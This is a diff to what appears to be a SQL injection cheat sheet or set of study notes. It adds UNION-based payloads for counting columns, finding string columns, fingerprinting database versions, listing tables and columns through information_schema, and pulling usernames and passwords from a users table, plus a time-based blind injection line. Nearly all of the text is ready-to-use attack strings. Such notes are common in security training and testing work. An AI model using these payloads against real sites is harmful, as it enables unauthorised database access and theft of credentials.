@@ -32,9 +32,13 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2
 
 Determine the number of columns returned by the original query.
 Continue increasing the number until you get an error.
+
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
+
+If -- gives an error, use #. Example: ' ORDER BY 1#
+You can also use + for blank spaces. Example: '+ORDER+BY+1--
 
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
@@ -43,22 +47,23 @@ Continue increasing the number until you get an error.
 Find the column that contains string data.
 This depends on the number of columns you discovered above.
 This example uses 3 columns.
-Look for an additional row with test.
+Look for a row at the bottom of the page with test.
 ' UNION SELECT 'test', NULL, NULL--
 ' UNION SELECT NULL, 'test', NULL--
 ' UNION SELECT NULL, NULL, 'test'--
 
-- Examining the database in SQL injection attacks
-
-When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
-
 - Get the database type and version
-Microsoft, MySQL     SELECT @@version
-Oracle               SELECT * FROM v$version
-PostgreSQL           SELECT version()
+Microsoft, MySQL     ' UNION SELECT @@version--
+Oracle               ' UNION SELECT * FROM v$version--
+PostgreSQL           ' UNION SELECT version()--
 
-Use a UNION attack:
-' UNION SELECT @@version--
+- List the contents of a database
+' UNION SELECT 'test','foo'--
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+' UNION SELECT username, password FROM users--
+
+' UNION SELECT * FROM information_schema.tables--
+' UNION SELECT * FROM information_schema.columns WHERE table_name = '<table>'--
 
 - Blind SQLi
 '; waitfor delay ('0:0:20')--
